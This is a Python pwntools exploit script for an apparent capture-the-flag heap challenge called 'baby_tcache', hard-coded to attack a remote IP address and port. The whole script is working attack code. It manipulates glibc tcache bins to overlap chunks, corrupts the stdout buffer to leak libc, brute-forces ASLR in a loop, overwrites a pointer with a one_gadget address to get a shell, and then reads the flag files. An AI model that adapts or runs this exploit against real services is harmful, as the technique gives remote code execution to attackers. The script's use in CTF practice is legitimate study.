from pwn import *
import time

context.log_level = 'debug'
def exploit(r):
    
    def new(content, size=None):
        if not size:
            size = len(content)
        #r.sendafter('Your choice: ', '1'+'\x00'*15)
        #r.sendafter('Size:', str(size).ljust(16, '\x00'))
        #r.sendafter('Data:', content)
        r.send('1'+'\x00'*15)
        r.send(str(size).ljust(16, '\x00'))
        r.sendafter('Data:', content)
        r.recvuntil('$$$')
    
    def delete(idx):
        #r.sendafter('Your choice: ', '2'+'\x00'*15)
        #r.sendafter('Index:', str(idx).ljust(16, '\x00'))
        r.send('2'+'\x00'*15)
        r.send(str(idx).ljust(16, '\x00'))
    
    for i in range(9):
        new('A'*0xf0)
    new('A'*0x10)
    for i in range(8):
        delete(i)
    
    new('A', size=0x80)
    new('\n', size=0x10)#victim 1
    new('\n', size=0x20)#victim 2
    new('B'*0x10+p64(0x100))
    delete(9)
    delete(1)
    delete(2)
    # exhaust 0x90 tcache bin so that it will be placed in unsorted bin later
    for i in range(7):
        new('D'*0x80)
    for i in range(4):
        delete(i+4)
    delete(1)
    delete(2)
    delete(9)

    # reorder tcache bins
    new('D', size=0x10)
    new('D', size=0x10)
    new('D', size=0x20)
    new('E', size=0x10)
    new('E', size=0x20)
    delete(6)
    delete(5)
    delete(4)
    delete(1)
    delete(2)
    
    # cause overlapping
    delete(0)
    delete(1)
    delete(8)
    
    # overwrite stdout buffer to do a leak
    new('A'*0x88+p64(0x21)+'\xc0', size=0xa0)
    
    # introduce a good libc pointer(ends with 0xddxxxx when aslr is disabled)
    # so that we only need bruteforce half a byte
    new('A', size=0x1f00)
    new('A', size=0x200)
    delete(1)
    new('A', size=0x2000)
    delete(1)
    
    # leak libc
    new('B', size=0x10)
    new('\x88\x07', size=0x1f00)
    new('B', size=0x10)
    new('B', size=0x10)
    r.sendafter('Your choice: ', '1'+'\x00'*15)
    r.sendafter('Size:', str(16).ljust(16, '\x00'))
    r.interactive()
    #gdb.attach(r)
    r.send('\xff\xff')
    content = r.recvuntil('$$$$$')
    print([content])
    #exit()
    libc_ptr = u64(content[5:13])
    libc_base = (libc_ptr&0xfffffffffffff000) - (0xdd1000 - 0x9e4000)
    magic = libc_base + 0x10a38c
    log.info('libc base: %#x' % libc_base)
    log.info('magic: %#x' % magic)
    
    # reintroduce the libc pointer
    new('\x30\xfc', size=0x70)
    new('D'*0x20)
    delete(1)
    delete(2)
    new(p64(magic), size=0x20)
    #gdb.attach(r)
    
    # trigger
    r.sendafter('Your choice: ', '1')
    r.sendlineafter('Size:', '10')
    time.sleep(1)
    r.sendline('cat /home/*/fl4g*')
    
    r.interactive()
while True:
    #r = process('./baby_tcache', env={'LD_PRELOAD':'./libc.so.6'})
    #r = process('./baby_tcache')
    r = remote('52.68.236.186', 56746)
    #r = remote('127.0.0.1', 8333)
    try:
        exploit(r)
    except EOFError:
        r.close()
    except struct.error:
        r.close()
